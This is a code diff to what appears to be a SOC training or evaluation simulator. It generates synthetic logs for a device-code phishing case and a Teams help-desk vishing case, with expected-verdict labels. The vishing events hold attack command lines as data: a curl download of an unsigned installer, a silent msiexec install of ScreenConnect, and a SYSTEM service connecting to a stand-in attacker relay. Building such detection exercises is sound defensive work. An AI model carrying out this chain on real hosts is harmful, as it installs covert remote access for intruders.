@@ -18,10 +18,10 @@ import { sentinelAlert } from "@/lib/sim/emitters/sentinel";
 import { csAlert, csDns, csFile, csProcess } from "@/lib/sim/emitters/crowdstrike";
 import { panConnection, panWeb } from "@/lib/sim/emitters/paloalto";
 import { winServiceInstall } from "@/lib/sim/emitters/windowsSecurity";
+import { serviceNowRecord } from "@/lib/sim/emitters/servicenow";
 import { mailClick, mailDelivered } from "@/lib/sim/scenario-packs/corroboratingTelemetry.events";
-import { AD_COMPANIES, clock, incident, lookalike, type CoreStoryDef } from "./_kit";
+import { AD_COMPANIES, OFFICE_EGRESS, clock, incident, lookalike, type CoreStoryDef } from "./_kit";
 
-const OFFICE_EGRESS = "217.177.80.10";
 const BROKER_APP_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e";
 const UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.3520.46";
 const UA_PYTHON = "python-requests/2.32.3";
@@ -40,6 +40,8 @@ function deviceCodePhish(): TelemetryEvent[] {
   const deviceId = "d41e7c60-2f8b-4a3e-b0c1-7e55a9c3d210";
   const correlation = "a7c2f190-6b1e-4e0a-8d33-52c9e10b7f44";
   const rogueDevice = "DESKTOP-K7Q2M1R";
+  const secondLure = "Microsoft Teams invitation: supplier review, meeting ID enclosed";
+  const secondId = "<b4e70c19d2a6@nexacorp.com>";
   return incident("inc:core-device-code:1", [
     lookalike(entraSignIn({
       companyId: cx, id: "cdc01", ts: T(0), user: "mtr.boardroom3@nexacorp.com", srcIp: OFFICE_EGRESS, app: "Microsoft Teams",
@@ -97,9 +99,9 @@ function deviceCodePhish(): TelemetryEvent[] {
       description: "Entra ID audit: Add registered owner to device, DESKTOP-K7Q2M1R assigned to v.marchetti.",
     }),
     entraSignIn({
-      companyId: cx, id: "cdc10", ts: T(1680), user: v, srcIp: attacker, app: "Microsoft Graph", resource: "Microsoft Graph", isInteractive: false, mfa: true, deviceName: rogueDevice, deviceId, os: "Windows 10",
+      companyId: cx, id: "cdc10", ts: T(1680), user: v, srcIp: attacker, app: "Microsoft Authentication Broker", appId: BROKER_APP_ID, resource: "Microsoft Graph", isInteractive: false, mfa: true, deviceName: rogueDevice, deviceId, os: "Windows 10",
       incomingTokenType: "primaryRefreshToken", trustType: "Workplace", userAgent: UA_PYTHON, asn: 64511, severity: "high", mitre: "T1550.001", tactic: "Lateral Movement", extra: { "azure.signinlogs.properties.clientAppUsed": "Mobile Apps and Desktop clients" },
-      description: "Entra ID non-interactive sign-in for v.marchetti to Microsoft Graph from 203.0.113.201 on device DESKTOP-K7Q2M1R.",
+      description: "Entra ID non-interactive sign-in for v.marchetti through Microsoft Authentication Broker to Microsoft Graph from 203.0.113.201 on device DESKTOP-K7Q2M1R, incoming token a primary refresh token.",
     }),
     m365Operation({
       companyId: cx, id: "cdc11", ts: T(1860), user: v, operation: "MailItemsAccessed", workload: "Exchange", srcIp: attacker, sessionId: session, userAgent: UA_PYTHON,
@@ -108,8 +110,15 @@ function deviceCodePhish(): TelemetryEvent[] {
     }),
     m365Operation({
       companyId: cx, id: "cdc12", ts: T(2340), user: v, operation: "Send", workload: "Exchange", srcIp: attacker, sessionId: session, userAgent: UA_PYTHON,
-      severity: "high", mitre: "T1534", tactic: "Lateral Movement", extra: { "Item.Subject": "Microsoft Teams invitation: supplier review, meeting ID enclosed", "Item.ParentFolder.Path": "\\Sent Items" },
-      description: "Unified audit log: Send from v.marchetti's mailbox at 203.0.113.201, subject a Teams invitation to a supplier review, addressed to internal recipients.",
+      severity: "high", mitre: "T1534", tactic: "Lateral Movement", extra: { ClientAppId: BROKER_APP_ID, "Item.Subject": secondLure, "Item.InternetMessageId": secondId, "Item.ParentFolder.Path": "\\Sent Items" },
+      description: "Unified audit log: Send from v.marchetti's mailbox at 203.0.113.201, subject a Teams invitation to a supplier review.",
+    }),
+    mailDelivered({
+      id: "cdc13", ts: T(2346), incidentId: "inc:core-device-code:1", user: "j.chen@nexacorp.com", sender: v, headerFrom: `"Valeria Marchetti" <${v}>`,
+      subject: secondLure, messageId: secondId, senderIp: "10.10.20.25", qid: "7Cd41F1B07",
+      url: "https://microsoft.com/devicelogin", urlRewritten: "https://microsoft.com/devicelogin", domain: "microsoft.com",
+      spf: "pass", dkim: "pass", dmarc: "pass", phishScore: 6, spamScore: 2, severity: "medium", mitre: "T1534", tactic: "Lateral Movement",
+      description: "A Teams invitation from v.marchetti was delivered to j.chen, with the same subject and message id as the Send record. The only link is the Microsoft device login page.",
     }),
   ]);
 }
@@ -121,7 +130,7 @@ function teamsHelpdeskVishing(): TelemetryEvent[] {
   const v = "h.novak@nexacorp.com";
   const host = "WS-ACC-4477";
   const ip = "10.10.20.77";
-  const it = "t.brandt@nexacorp.com";
+  const it = "l.ferreira@nexacorp.com";
   const cs = { companyId: cx, host, user: v, srcIp: ip };
   const qa = "C:\\Program Files\\WindowsApps\\MicrosoftCorporationII.QuickAssist_2.0.31.0_x64__8wekyb3d8bbwe\\Microsoft.RemoteAssistance.QuickAssist\\QuickAssist.exe";
   const qaHash = makeSha256("quick-assist-signed-microsoft");
@@ -129,19 +138,27 @@ function teamsHelpdeskVishing(): TelemetryEvent[] {
   const curlHash = makeSha256("windows_curl_exe_signed_microsoft");
   const installer = "C:\\ProgramData\\spamfilter\\update_client.exe";
   const installerHash = makeSha256("core-teams-remote-client-installer");
-  const svcPath = "C:\\Program Files (x86)\\ScreenConnect Client (4f1e9a07c2d3)\\ScreenConnect.ClientService.exe";
+  const scId = "4f1e9a07c2d3b86e";
+  const svcPath = `C:\\Program Files (x86)\\ScreenConnect Client (${scId})\\ScreenConnect.ClientService.exe`;
+  const msi = "C:\\Windows\\System32\\msiexec.exe";
+  const scArgs = (host: string) => `"?e=Access&y=Guest&h=${host}&p=8041&s=7d0c2e4a-91f6-4b38-a6d2-3e5f10c8b947"`;
   const svcHash = makeSha256("remote-support-client-signed");
   const relayIp = "203.0.113.202";
   const relay = "relay-417.supportdesk-remote.example";
   const stageIp = "203.0.113.203";
   const stage = "spamfilter-update.example";
-  const tenant = "b6d2f7e4-90c1-4a17-8e3a-6c1f0a2b7d55";
   return incident("inc:core-teams-vish:1", [
+    { ...serviceNowRecord({
+      companyId: cx, id: "ctv00", ts: T(0), table: "incident", number: "INC0048812", state: "Resolved", callerId: v, user: v, severity: "informational",
+      shortDescription: "Printer not responding on WS-ACC-4477, fixed in a Quick Assist session with the user on the phone",
+      extra: { "servicenow.assigned_to": it, "servicenow.assignment_group": "Service Desk", "servicenow.contact_type": "Phone" },
+      description: "ServiceNow incident INC0048812, printer fault on WS-ACC-4477, resolved by l.ferreira of the Service Desk in a Quick Assist session.",
+    }), expected_verdict: "informational" as const },
     lookalike(csProcess({
-      ...cs, id: "ctv01", ts: T(0), user: it, processName: "QuickAssist.exe", pid: 6120, processPath: qa, cmdline: `"${qa}"`, parentName: "explorer.exe", parentPid: 3480,
-      sha256: qaHash, signed: true, signatureSubject: "Microsoft Corporation", severity: "low",
-      description: "QuickAssist.exe started on WS-ACC-4477 from explorer.exe during a session for t.brandt, an IT support technician.",
-    }), "Help desk ticket: the IT technician used Quick Assist with the user on the phone to fix a printer. The technician is in the company directory and the session ended with the ticket."),
+      ...cs, id: "ctv01", ts: T(45), processName: "QuickAssist.exe", pid: 6120, processPath: qa, cmdline: `"${qa}"`, parentName: "explorer.exe", parentPid: 3480,
+      sha256: qaHash, signed: true, signatureSubject: "Microsoft Corporation", severity: "medium",
+      description: "QuickAssist.exe started on WS-ACC-4477 from explorer.exe for h.novak.",
+    }), "Incident INC0048812 in ServiceNow covers this session: the user called the Service Desk about a printer, and the technician on the ticket used Quick Assist with them. No chat from an outside tenant and no download follows."),
     { ...sentinelAlert({
       companyId: cx, id: "ctv02", ts: T(3600), user: v, srcIp: "198.51.100.204", alertName: "Inbound mail volume far above baseline for one recipient", severity: "medium",
       mitre: "T1667", tactic: "Impact", detail: "Inbound message count to one mailbox exceeded the anomaly threshold; most senders are newsletter and sign-up confirmation services.",
@@ -154,33 +171,33 @@ function teamsHelpdeskVishing(): TelemetryEvent[] {
         ChatThreadId: "19:b6d2f7e490c14a17@unq.gbl.spaces",
         CommunicationType: "OneonOne",
         Members: [
-          { DisplayName: "Help Desk", UPN: "helpdesk@supportdesk-remote.example", OrganizationId: tenant },
+          { DisplayName: "Help Desk", UPN: "helpdesk@supportdesk-remote.example" },
           { DisplayName: "Hana Novak", UPN: v },
         ] as unknown as string,
-        ParticipantInfo: { HasForeignTenantUsers: true, HasGuestUsers: false, HasOtherGuestUsers: false, ParticipatingTenantIds: [tenant] } as unknown as string,
+        ParticipantInfo: { HasForeignTenantUsers: true, HasGuestUsers: false, HasOtherGuestUsers: false } as unknown as string,
       },
       description: "Microsoft 365 audit: ChatCreated, a one-on-one Teams chat with h.novak started by a user with display name Help Desk, UPN helpdesk@supportdesk-remote.example, HasForeignTenantUsers true.",
     }),
-    { ...csAlert({
-      ...cs, id: "ctv04", ts: T(4560), threatName: "Suspicious activity using Quick Assist", detail: "A Quick Assist session started on this device.",
-      mitre: "T1219.002", tactic: "Command and Control", technique: "Remote Access Tools: Remote Desktop Software", severity: "high", action: "detected",
-      processName: "QuickAssist.exe", processPath: qa, cmdline: `"${qa}"`, pid: 7204, parentPath: "C:\\Windows\\explorer.exe", processTree: "explorer.exe > QuickAssist.exe",
-      description: "EDR alert on WS-ACC-4477: Suspicious activity using Quick Assist, process QuickAssist.exe (pid 7204) under explorer.exe for h.novak.",
-    }), edr_scope: "hybrid" as const },
     csProcess({
       ...cs, id: "ctv05", ts: T(4561), processName: "QuickAssist.exe", pid: 7204, processPath: qa, cmdline: `"${qa}"`, parentName: "explorer.exe", parentPid: 3480,
       sha256: qaHash, signed: true, signatureSubject: "Microsoft Corporation", severity: "medium", mitre: "T1219.002", tactic: "Command and Control",
       description: "QuickAssist.exe started on WS-ACC-4477 from explorer.exe for h.novak.",
     }),
     csDns({
-      ...cs, id: "ctv06", ts: T(4563), domain: "remoteassistance.support.services.microsoft.com", resolvedIp: "13.107.246.60", processName: "QuickAssist.exe", processPath: qa, pid: 7204,
+      ...cs, id: "ctv06", ts: T(4563), domain: "remoteassistance.support.services.microsoft.com", resolvedIp: "203.0.113.215", processName: "QuickAssist.exe", processPath: qa, pid: 7204,
       parentName: "explorer.exe", parentPid: 3480, severity: "low",
       description: "QuickAssist.exe (pid 7204) resolved remoteassistance.support.services.microsoft.com.",
     }),
+    { ...csAlert({
+      ...cs, id: "ctv04", ts: T(4566), threatName: "Suspicious activity using Quick Assist", detail: "A Quick Assist session started on this device.",
+      mitre: "T1219.002", tactic: "Command and Control", technique: "Remote Access Tools: Remote Desktop Software", severity: "high", action: "detected",
+      processName: "QuickAssist.exe", processPath: qa, cmdline: `"${qa}"`, pid: 7204, parentPath: "C:\\Windows\\explorer.exe", processTree: "explorer.exe > QuickAssist.exe",
+      description: "EDR alert on WS-ACC-4477: Suspicious activity using Quick Assist, process QuickAssist.exe (pid 7204) under explorer.exe for h.novak.",
+    }), edr_scope: "hybrid" as const },
     csProcess({
-      ...cs, id: "ctv07", ts: T(4800), processName: "cmd.exe", pid: 7380, processPath: "C:\\Windows\\System32\\cmd.exe", cmdline: "cmd.exe", parentName: "QuickAssist.exe", parentPid: 7204,
-      sha256: cmdHash, signed: true, signatureSubject: "Microsoft Corporation", severity: "high", mitre: "T1059.003", tactic: "Execution",
-      description: "cmd.exe started as a child of QuickAssist.exe on WS-ACC-4477.",
+      ...cs, id: "ctv07", ts: T(4800), processName: "cmd.exe", pid: 7380, processPath: "C:\\Windows\\System32\\cmd.exe", cmdline: "cmd.exe", parentName: "explorer.exe", parentPid: 3480,
+      sha256: cmdHash, signed: true, signatureSubject: "Microsoft Corporation", severity: "medium", mitre: "T1059.003", tactic: "Execution",
+      description: "cmd.exe started from explorer.exe on WS-ACC-4477 for h.novak, four minutes into the Quick Assist session.",
     }),
     csProcess({
       ...cs, id: "ctv08", ts: T(4830), processName: "curl.exe", pid: 7412, processPath: "C:\\Windows\\System32\\curl.exe",
@@ -198,13 +215,23 @@ function teamsHelpdeskVishing(): TelemetryEvent[] {
       actorPath: "C:\\Windows\\System32\\curl.exe", mitre: "T1105", tactic: "Command and Control",
       description: "curl.exe (pid 7412) wrote C:\\ProgramData\\spamfilter\\update_client.exe.",
     }),
-    winServiceInstall({
-      companyId: cx, id: "ctv11", ts: T(4920), host, targetUser: "SYSTEM", userEmail: null, serviceName: "ScreenConnect Client (4f1e9a07c2d3)",
-      imagePath: `"${svcPath}" "?e=Access&y=Guest&h=${relay}&p=8041"`, logSource: "windows_security", severity: "high", mitre: "T1543.003", tactic: "Persistence",
-      description: "System log 7045 on WS-ACC-4477: service ScreenConnect Client (4f1e9a07c2d3) installed, auto start, connecting to relay-417.supportdesk-remote.example.",
+    csProcess({
+      ...cs, id: "ctv10a", ts: T(4890), processName: "update_client.exe", pid: 7466, processPath: installer, cmdline: `"${installer}"`, parentName: "cmd.exe", parentPid: 7380, sha256: installerHash, signed: false,
+      severity: "high", mitre: "T1204.002", tactic: "Execution",
+      description: "update_client.exe started from cmd.exe (pid 7380) in C:\\ProgramData\\spamfilter on WS-ACC-4477. The file is unsigned.",
     }),
     csProcess({
-      ...cs, id: "ctv12", ts: T(4925), processName: "ScreenConnect.ClientService.exe", pid: 8120, processPath: svcPath, cmdline: `"${svcPath}" "?e=Access&y=Guest&h=${relay}&p=8041"`,
+      ...cs, id: "ctv10b", ts: T(4894), processName: "msiexec.exe", pid: 7498, processPath: msi, cmdline: `msiexec.exe /i "C:\\ProgramData\\spamfilter\\ScreenConnect.ClientSetup.msi" /qn`, parentName: "update_client.exe", parentPid: 7466,
+      sha256: makeSha256("windows_msiexec_exe_signed_microsoft"), signed: true, signatureSubject: "Microsoft Corporation", severity: "medium", mitre: "T1218.007", tactic: "Stealth",
+      description: "msiexec.exe installed ScreenConnect.ClientSetup.msi silently, started by update_client.exe.",
+    }),
+    winServiceInstall({
+      companyId: cx, id: "ctv11", ts: T(4920), host, targetUser: "SYSTEM", userEmail: null, serviceName: `ScreenConnect Client (${scId})`,
+      imagePath: `"${svcPath}" ${scArgs(relay)}`, logSource: "windows_security", severity: "high", mitre: "T1543.003", tactic: "Persistence",
+      description: `System log 7045 on WS-ACC-4477: service ScreenConnect Client (${scId}) installed, auto start, connecting to relay-417.supportdesk-remote.example.`,
+    }),
+    csProcess({
+      ...cs, id: "ctv12", ts: T(4925), processName: "ScreenConnect.ClientService.exe", pid: 8120, processPath: svcPath, cmdline: `"${svcPath}" ${scArgs(relay)}`,
       parentName: "services.exe", parentPid: 740, sha256: svcHash, signed: true, signatureSubject: "ConnectWise, LLC", runAsUser: "NT AUTHORITY\\SYSTEM", integrity: "system", severity: "high",
       mitre: "T1219.002", tactic: "Command and Control",
       description: "ScreenConnect.ClientService.exe started from services.exe on WS-ACC-4477 as SYSTEM, relay host relay-417.supportdesk-remote.example.",
